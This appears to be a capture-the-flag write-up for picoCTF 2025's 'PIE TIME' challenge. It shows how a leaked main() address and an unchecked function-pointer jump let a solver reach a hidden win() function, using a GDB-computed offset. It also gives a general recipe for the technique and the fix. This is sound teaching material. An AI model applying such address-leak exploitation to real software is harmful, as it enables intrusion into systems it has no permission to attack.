# Challenge Write-Up — PIE TIME

---

## 📌 Challenge Overview

| Field           | Information                                                        |
| :-------------- | :----------------------------------------------------------------- |
| **Competition** | picoCTF 2025                                                       |
| **Category**    | Binary Exploitation                                                |
| **Difficulty**  | Medium                                                             |
| **Objective**   | Find the address of the `win()` function at runtime and jump to it to get the flag |

---

## Initial Analysis

I was given a program and its source code. The program prints the address of `main()`, then asks you to type in a memory address and it literally jumps to whatever address you give it.

The goal was to make it jump to `win()`, a hidden function that prints the flag. The problem is the binary uses **PIE**, which means the addresses change every time the program runs. So I couldn't just hardcode an address.

My plan:
- Read the source code to understand what's going on
- Use GDB to figure out how far `win()` is from `main()`
- Use that distance to calculate `win()`'s address when connecting to the server

---

## 🔎 Step 1 — Read the Source Code

The source code made the vulnerability obvious:

```c
printf("Address of main: %p\n", &main); // prints main's address

unsigned long val;
scanf("%lx", &val);         // reads whatever address you type

void (*foo)(void) = val;
foo();                       // jumps to it — no questions asked
```

Three things stood out:

- The program **tells you where `main()` is** before you do anything
- It takes your input and **runs it as code** — no checks at all
- There is a `win()` function in the binary that never gets called normally

---

## Step 2 — Find the Distance Between `win()` and `main()` Using GDB

Even though addresses change every run, the **gap between two functions always stays the same**. That's because the gap is baked in at compile time — only the starting point shifts.

I opened the binary in GDB:

```bash
gdb vuln
```

Then I checked both function addresses:

```
(gdb) disassemble win
→ starts at 0x12a7

(gdb) disassemble main
→ starts at 0x133d
```

Then I did the math:

```
0x133d - 0x12a7 = 0x96
```

So `win()` is always **0x96 bytes before `main()`**, no matter where the program loads.

---

## Step 3 — Connect to the Server

```bash
nc rescued-float.picoctf.net {port_number}
```

The program printed:

```
Address of main: 0x61cbb49cd33d
Enter the address to jump to, ex => 0x12345:
```

That's all I needed.

---

## Step 4 — Calculate `win()`'s Address

```
win = main - 0x96
    = 0x61cbb49cd33d - 0x96
    = 0x61cbb49cd2a7
```

I typed that address in when prompted.

---

## Step 5 — Get the Flag

```
You won!
picoCTF{...flag...}
```

It worked. ✅

---

## 🏁 Flag

```
picoCTF{r3loc4t1on_1s_k3y_<hash>}
```

---

## 🔬 What Made This Work

PIE is supposed to make exploits harder by randomizing where the program loads in memory each run. But it only works if the program doesn't tell you where it is.

This program printed `main()`'s address right at the start — which completely gave the game away. Once you know one address, you can find everything else using the fixed gaps between functions.

The two things that made the exploit possible:
- The program **leaked its own address** (the `printf` with `main`)
- The program **ran whatever address you typed** with zero validation

Without either of those, this attack doesn't work.

---

## 🎯 How to Solve Challenges Like This

1. Read the source code and look for address leaks and unchecked function pointers
2. Open the binary in GDB and calculate the gap between the leaked function and your target
3. Connect to the server and grab the leaked address
4. Subtract the gap to get the target's real address
5. Send it in — done

---

## 🧩 Final Thoughts

The big lesson here: **a single address leak can break the whole protection**.

PIE and ASLR are solid defenses on their own. But the moment this program printed `main()`'s address, all that randomization became useless. One line of code undid the entire security feature.

The fix is simple — just remove the `printf` that prints `main`'s address. Without that, you'd have no starting point and the attack falls apart.

---
